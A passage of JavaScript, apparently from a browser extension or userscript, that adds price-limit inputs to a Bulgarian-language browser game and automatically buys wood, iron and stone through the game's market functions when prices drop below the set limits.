"ironMaxPriceLabel.textContent = 'Iron Max Price:';"+
"document.body.appendChild(ironMaxPriceLabel);"+
"var ironMaxPriceBox = document.createElement('input');"+
"ironMaxPriceBox.setAttribute('id','ironMaxPriceBox');"+
"ironMaxPriceBox.style.display = 'block';"+
"ironMaxPriceBox.style.width = '125px';"+
"document.body.appendChild(ironMaxPriceBox);"+
"var stoneMaxPriceLabel = document.createElement('p');"+
"stoneMaxPriceLabel.setAttribute('id','stoneMaxPriceLabel');"+
"stoneMaxPriceLabel.style.display = 'block';"+
"stoneMaxPriceLabel.textContent = 'Stone Max Price:';"+
"document.body.appendChild(stoneMaxPriceLabel);"+
"var stoneMaxPriceBox = document.createElement('input');"+
"stoneMaxPriceBox.setAttribute('id','stoneMaxPriceBox');"+
"stoneMaxPriceBox.style.display = 'block';"+
"stoneMaxPriceBox.style.width = '125px';"+
"document.body.appendChild(stoneMaxPriceBox);};"+
"createElements();"+
"var clear = function(){document.getElementById('woodMaxPriceBox').remove();"+
    "document.getElementById('ironMaxPriceBox').remove();"+
    "document.getElementById('stoneMaxPriceBox').remove();"+
    "document.getElementById('woodMaxPriceLabel').remove();"+
    "document.getElementById('ironMaxPriceLabel').remove();"+
    "document.getElementById('stoneMaxPriceLabel').remove();};"+
"var e = $.Event('keyup');e.keyCode= 39;var curPrices = {wood: 0,iron: 0,stone: 0};"+
"var initialise = function init(){"+
"var market = document.getElementById('market');"+
"curPrices.wood = market.getElementsByTagName('li')[2].textContent;"+
"curPrices.iron = market.getElementsByTagName('li')[3].textContent;"+
"curPrices.stone =  market.getElementsByTagName('li')[4].textContent;};"+
"var buyWood = function bW(){"+
"xajax_buyResources(123456,1);"+
"setTimeout(function(){"+
    "var mbx = document.getElementById('messagebox123456');"+
    "var woodQuanty = mbx.getElementsByTagName('a')[1].textContent;"+
    "var woodInpt = document.getElementById('amountToBuyId');"+
    "$('#amountToBuyId').val(woodQuanty);"+
    "$('#amountToBuyId').trigger(e);"+
    "$('#buyForm .button-v2').submit();"+
    "var boughtLi = document.createElement('li');"+
    "boughtLi.style.backgroundColor = 'lightBlue';"+
    "boughtLi.setAttribute('id','boughtLi');"+
    "boughtLi.style.display = 'iline-block';"+
    "boughtLi.style.borderStyle = 'inset';"+
    "boughtLi.textContent = 'bought '+woodQuanty+' wood  for '+curPrices.wood+' per а unit';"+
    "document.getElementById('bought').appendChild(boughtLi);},700);};"+
"var buyIron = function bI(){"+
"xajax_buyResources(123456,2);"+
"setTimeout(function(){"+
    "var mbx = document.getElementById('messagebox123456');"+
	"var ironQuanty = mbx.getElementsByTagName('a')[1].textContent;"+
    "var ironInpt = $('#amountToBuyId');"+
    "$('#amountToBuyId').val(ironQuanty);"+
    "$('#amountToBuyId').trigger(e);"+
    "$('#buyForm .button-v2').submit();"+
    "var boughtLi = document.createElement('li');"+
    "boughtLi.style.backgroundColor = 'lightBlue';"+
    "boughtLi.setAttribute('id','boughtLi');"+
    "boughtLi.style.borderStyle = 'inset';"+
    "boughtLi.textContent = 'bought '+ironQuanty+' iron  for '+curPrices.iron+' per а unit';"+
    "document.getElementById('bought').appendChild(boughtLi);},700);};"+
"var buyStone = function bS(){"+
"xajax_buyResources(123456,3);"+
"setTimeout(function(){"+
    "var mbx = document.getElementById('messagebox123456');"+
    "var stoneQuanty = mbx.getElementsByTagName('a')[1].textContent;"+
    "var stoneInpt = $('#amountToBuyId');"+
    "$('#amountToBuyId').val(stoneQuanty);"+
    "$('#amountToBuyId').trigger(e);"+
    "$('#buyForm .button-v2').submit();"+
    "var boughtLi = document.createElement('li');"+
    "boughtLi.style.backgroundColor = 'lightBlue';"+
    "boughtLi.setAttribute('id','boughtLi');"+
    "boughtLi.style.borderStyle = 'inset';"+
    "boughtLi.textContent = 'bought '+stoneQuanty+' stone for '+curPrices.stone+' per а unit';"+
    "document.getElementById('bought').appendChild(boughtLi);},700);};"+
    "var createInfoElements = function(){"+
"var woodInfoLabel = document.createElement('p');"+
"woodInfoLabel.textContent = 'Wood max price:';"+
"document.getElementById('info').appendChild(woodInfoLabel);"+
"var woodInfo = document.createElement('li');"+
"woodInfo.setAttribute('id','woodInfo');"+
"woodInfo.style.backgroundColor = 'lightBlue';"+
"woodInfo.style.borderStyle = 'inset';"+
"document.getElementById('info').appendChild(woodInfo);"+
"var ironInfoLabel = document.createElement('p');"+
"ironInfoLabel.textContent = 'Iron max price:';"+
"document.getElementById('info').appendChild(ironInfoLabel);"+
"var ironInfo = document.createElement('li');"+
"ironInfo.setAttribute('id','ironInfo');"+
"ironInfo.style.backgroundColor = 'lightBlue';"+
"ironInfo.style.borderStyle = 'inset';"+
"document.getElementById('info').appendChild(ironInfo);"+
"var stoneInfoLabel = document.createElement('p');"+
"stoneInfoLabel.textContent = 'Stone max price:';"+
"document.getElementById('info').appendChild(stoneInfoLabel);"+
"var stoneInfo = document.createElement('li');"+
"stoneInfo.setAttribute('id','stoneInfo');"+
"stoneInfo.style.backgroundColor = 'lightBlue';"+
"stoneInfo.style.borderStyle = 'inset';"+
"document.getElementById('info').appendChild(stoneInfo);};"+
"createInfoElements();"+
"xajax_tradeTabs(containersStuff.findContaner({saveName:'trade',title:'Пазар'}),2,1);"+
"function makeDeal(){if(document.getElementById('woodMaxPriceBox')){"+
    "document.getElementById('woodInfo').textContent = $('#woodMaxPriceBox').val();"+
    "document.getElementById('ironInfo').textContent = $('#ironMaxPriceBox').val();"+
    "document.getElementById('stoneInfo').textContent = $('#stoneMaxPriceBox').val();}"+
"var bought = document.createElement('div');"+
"bought.style.marginLeft =  '130px';"+
"bought.style.display = 'block';"+
"bought.style.marginTop = '470px';"+
"bought.style.backgroundColor = 'lightBlue';"+
"bought.style.borderStyle = 'inset';"+
"bought.setAttribute('id','bought');"+
"bought.style.position = 'absolute';"+
"bought.textContent = 'ЗАКУПЕНИ РЕСУРСИ:';"+
"document.body.appendChild(bought);"+
"var woodMaxPrice = document.getElementById('woodInfo').textContent;"+
    "var ironMaxPrice = document.getElementById('ironInfo').textContent;"+
    "var stoneMaxPrice = document.getElementById('stoneInfo').textContent;"+
"if(document.getElementById('woodMaxPriceBox')){clear();}"+
"xajax_buyResources(123456,1);initialise();$(document).ready(function(){"+
    "document.getElementById('startBtn').style.backgroundColor = 'green';"+
    "document.getElementById('startBtn').value = 'Working';});"+
    "if(Number(curPrices.wood) <=Number(woodMaxPrice)){buyWood();setTimeout(function(){makeDeal();},2000);}"+
    "else if(Number(curPrices.iron)<=Number(ironMaxPrice)){buyIron();setTimeout(function(){makeDeal();},2000);}"+
    "else if(Number(curPrices.stone)<=Number(stoneMaxPrice)){buyStone();setTimeout(function(){makeDeal();},2000);}"+
    "else{setTimeout(function(){makeDeal();},300);}}"
            );
        }

     }
}
